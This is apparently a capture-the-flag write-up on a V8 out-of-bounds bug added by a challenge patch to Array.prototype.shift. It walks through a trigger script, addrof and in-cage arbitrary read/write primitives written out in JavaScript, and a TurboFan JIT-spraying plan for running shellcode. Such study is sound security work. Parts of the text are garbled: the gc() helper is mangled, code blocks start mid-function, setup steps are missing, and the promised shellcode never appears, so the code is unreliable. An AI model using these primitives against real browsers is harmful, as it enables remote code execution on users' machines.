## Understanding the Bug
`Array.prototype.shift` removes the first element from an array and returns the removed element. During this process, `TryArrayShift` is called. If this function fails, `GenericArrayShift` or `ArrayShift` will be executed instead.

```c++
// https://tc39.github.io/ecma262/#sec-array.prototype.shift
transitioning javascript builtin ArrayPrototypeShift(
    js-implicit context: NativeContext, receiver: JSAny)(...arguments): JSAny {
  try {
    return TryFastArrayShift(receiver) otherwise Slow, Runtime;
  } label Slow {
    return GenericArrayShift(receiver);
  } label Runtime {
    tail ArrayShift(
        context, LoadTargetFromFrame(), Undefined,
        Convert<int32>(arguments.actual_count));
  }
}
```

From the patched code we saw earlier, the exception handling for `array.length == 0` is performed by checking newLength < 0 (line 27). However, this check happens after `array.length` has already been modified by `witness.ChangeLength(newLength)`. As a result, the length becomes negative. Unlike Torque, in the C++ implementation the length is treated as `uint32_t` when accessing the array. Therefore, an OOB bug occurs.
```c++
macro TryFastArrayShift(implicit context: Context)(receiver: JSAny): JSAny
    labels Slow, Runtime {
  const array: FastJSArray = Cast<FastJSArray>(receiver) otherwise Slow;
  let witness = NewFastJSArrayWitness(array);

  witness.EnsureArrayPushable() otherwise Slow;

  // if (array.length == 0) {
  //   return Undefined;
  // }

  const newLength = array.length - 1;

  // Check that we're not supposed to right-trim the backing store, as
  // implemented in elements.cc:ElementsAccessorBase::SetLengthImpl.
  if ((newLength + newLength + kMinAddedElementsCapacity) <
      array.elements.length) {
    goto Runtime;
  }

  // Check that we're not supposed to left-trim the backing store, as
  // implemented in elements.cc:FastElementsAccessor::MoveElements.
  if (newLength > kMaxCopyElements) goto Runtime;

  const result = witness.LoadElementOrUndefined(0);
  witness.ChangeLength(newLength);
  if(newLength < 0)
    return result;
  witness.MoveElements(0, 1, Convert<intptr>(newLength));
  witness.StoreHole(newLength);
  return result;
}
```
Note that this behavior appears because the code has been modified by the patch file; the original code does not behave like this. The original source code for all the code shown above can be found [here](https://github.com/v8/v8/blob/main/src/builtins/array-shift.tq).

## Trigger the Bug

Using this bug, we can create an OOB array with the following code. Run `./x64.debug/d8 --allow-natives-syntax trigger.js`.

```js
let oob = [1.1];
print(oob.shift());

// oob.length changes from 0 to 0xffffffff
print(oob.shift());

%DebugPrint(oob);
```

Then, we can see that the length has changed to -1, as shown in image below. Now that we have an OOB array, we can access arbitrary locations in the heap. However, in V8 it is difficult to access arbitrary locations because of pointer compression. Also, if we do not know the address of the target object, the probability of a successful exploit is very low.
![](trigger_oob.png)

Therefore, a typical V8 exploit usually follows these steps.
1. **Addrof**: Read the pointer-compressed address of an arbitrary object.
2. **Cage Arbitrary Read (CAR) / Cage Arbitrary Write (CAW)**: Read a value from an arbitrary address within the pointer compression range, or write a desired value to that address.
3. **Prepare the exploit:**
    - **If the backing pointer of an ArrayBuffer is not pointer-compressed:**
        - **Arbitrary Address Read (AAR)**: Read data from an arbitrary address.
        - **Arbitrary Address Write (AAW)**: Write a desired value to an arbitrary address.
        - **WASM instance:**
            - If there is no W^X, the Wasm code page is RWX. Create a Wasm instance and use AAW to modify the Wasm code.
            - If W^X is enabled, change the flag to disable it, then proceed as in the RWX case.

    - **General case (often used because it results in a shorter exploit):**
        - Trigger TurboFan: Prepare an array to achieve RCE in a function and let TurboFan optimize that function.
4. **RCE**: Execute arbitrary code.

You might wonder why there is no ROP chain here. In practice, setting up a ROP chain is quite complex and time-consuming. In addition, the introduction of security mechanisms such as CET has made ROP chains a bit out of the meta compared to the techniques mentioned above. Although these protections are not fully applied to JIT code yet, using ROP chains is still very difficult on newer versions of V8.

In this challenge, overwriting the Wasm code is still quite difficult because of the pointer compression mechanism. Therefore, I will use the **TurboFan trigger** technique.

Basically, we place the shellcode in the program in the form of numbers. When TurboFan compiles the function into machine code, these values will be translated into the original shellcode. Then, we only need to overwrite a pointer to that shellcode.

The advantage of this technique is that the shellcode is already located in a code region that has **read** and **execute** permissions, so we do not need write permission. The details of how to construct the shellcode will be discussed later.

To facilitate the process above, we define the following functions:
1. **FTOI**: Converts a double value into a BigInt value.
2. **ITOF**: Converts a BigInt value into a double value.

## AddrOf
Let's implement an **AddrOf** primitive using the OOB array that we triggered earlier in `trigger.js`.

**Addrof** works by swapping information between objects. For example, if there is another array located at a higher memory address than the OOB array, we can use the OOB array to read data from that higher memory address. In this case, the `oob` object is in the state of `PACKED_DOUBLE_ELEMENTS`, so the information from the object at the higher memory address will be interpreted as a double.

To do this, we first need to know the distance between oob and the other array, so we check it using `%DebugPrint`. And we have the following code below.
```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function gc() {

    return u64_buf[0];

// Raise gc twice and send it to old space.gc();

// array.length changes from 0 to 0xffffffff.
```

If you are not familiar with `Old Space` and `New Space`, they are two heap regions in JavaScript. The heap regions in JavaScript are created using mmap in C++, since the V8 engine itself is written in C++.

In general, `New Space` stores pointers to newly allocated objects, while `Old Space` contains pointers to objects that survive two garbage collection cycles.

For exploitation, we usually want our objects to be placed in `Old Space`, because the memory layout there is more stable and easier to exploit. More details about memory management can be found in this blog (Nah i will write it later).

## Cage Arbitrary Read / Write

As mentioned earlier, we will use the **TurboFan trigger** technique for exploitation.

In order to exploit TurboFan, we need arbitrary read and write access to the Cage, so let's create **CAR** and **CAW** primitives that can read and write arbitrary addresses inside the Cage.

First, let's implement code to access an arbitrary address using an OOB array. Since we can leak the address of the element in the **OOB** array via **Addrof**, we can access it by calculating `(target address - oob element address) / 0x8` as the array index. At this point, we also need to handle cases where the target address is not **8-byte** aligned. For simplicity, we will handle the most common 8-byte and 4-byte cases.

Next, we build the **CAW** and **CAR** primitives based on the two helper functions, **itof** and **ftoi**. These functions also handle cases where the address is not 8-byte aligned. The code is shown below.

```js

}

function ftoi(val){ // float to integer
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){ // integer to float
    u64_buf[0] = val;
    return f64_buf[0];
}

function hex(val){
    return "0x" + val.toString(16)
}

function AddrOf(obj){
    addrof_dict[0] = obj;
    return ftoi(oob[2]) & 0xffffffffn
}

function lo32(val){
    return val&0xffffffffn;
}

function hi32(val){
    return val >> 32n;
}

function CAW(base, victim, value, size){

    idx = Number((victim - base) / 0x8n);
    if (idx < 0 && Number(victim - base) % 0x8)
        idx -= 1;
    // Actually, we cannot handle negative index
    if(size == 8) {
        if (Number(victim - base) % 0x8) { //Check alignment. If i != 0, handle it by splitting the value.
            oob[idx] = itof(lo32(ftoi(oob[idx])) + (lo32(value) << 32n));
            oob[idx+1] = itof(hi32(value) + (hi32(ftoi(oob[idx+1])) << 32n));
        }
        else
            oob[idx] = itof(value);
    }

    else if(size == 4) {
        if (Number(victim - base) % 0x8)
            oob[idx] = itof(lo32(ftoi(oob[idx])) + (value << 32n));
        else
            oob[idx] = itof(value + (hi32(ftoi(oob[idx])) << 32n));

    }

}

function CAR(base, victim, size){

    idx = Number((victim - base) / 0x8n);
    if (idx < 0 && Number(victim - base) % 0x8)
        idx -= 1;

    if (size == 8) {
        if (Number(victim - base) % 0x8)
            return hi32(ftoi(oob[idx])) + (lo32(ftoi(oob[idx+1])) << 32n); // little endian
        else
            return ftoi(oob[idx]);
    }

    else if(size == 4) {
        if (Number(victim - base) % 0x8)
            return hi32(ftoi(oob[idx]));
        else
            return lo32(ftoi(oob[idx]));
    }
}
```

If you notice, the oob array cannot be used to read or write elements when the index is "negative". In JavaScript, negative indices are interpreted as strings rather than actual array indices.

Therefore, how can we build a stronger read/write primitive that allows us to read and write arbitrary memory locations? The answer is `TypedArray`. More details about TypedArray are discussed in [this](https://kain1k.github.io/posts/chrome-p1/#v8-typed-arrays) blog.

Basically, `JSTypedArray` and `JSArrayBuffer` work together as a pair. `JSArrayBuffer` stores the raw data, while `JSTypedArray` acts as a view that allows us to interact with that raw data. With `JSTypedArray`, we can specify the data type that we want to work with. For example, when we implement the **itof** and **ftoi** functions, we use this pair to convert data between different representations. Here, **buf** is the `JSArrayBuffer`, while **f64_buf** and **u64_buf** are `JSTypedArray` views over that buffer.

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

...

function ftoi(val){ // float to integer
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){ // integer to float
    u64_buf[0] = val;
    return f64_buf[0];
}
```

Next, we leak the address of `rw_u8` and calculate the addresses of `base_pointer` and `external_pointer`. Finally, we overwrite external_pointer with null.

If you notice, I call `gc()` four times: two `gc()` calls after creating `oob` and `addr_dict`, and two more after creating `rw_u8` and `foo`. This ensures that the objects are gradually promoted to `Old Space` in the order we want. If there were only two `gc()` calls at the end, the objects would still eventually move to `Old Space,` but their positions might change in unexpected ways, and we would not be able to overwrite `rw_u8`.

Okay, now we understand how the IEEE numbers appear in the generated code. The idea is to pass the shellcode in the form of IEEE numbers and then redirect a pointer to the beginning of that shellcode. However, there is one problem: the shellcode will be split into multiple parts, each 8 bytes long, and they are not contiguous. Therefore, the last instruction of each shellcode chunk will be a `jmp` instruction that jumps to the next part of the shellcode.

We can see that the distance between the IEEE numbers is 12 bytes (0xC). Therefore, the end of each shellcode chunk must contain a `jmp 0xC` instruction or `EB OC`, except for the last shellcode chunk. And here is the shellcode that serves our purpose.
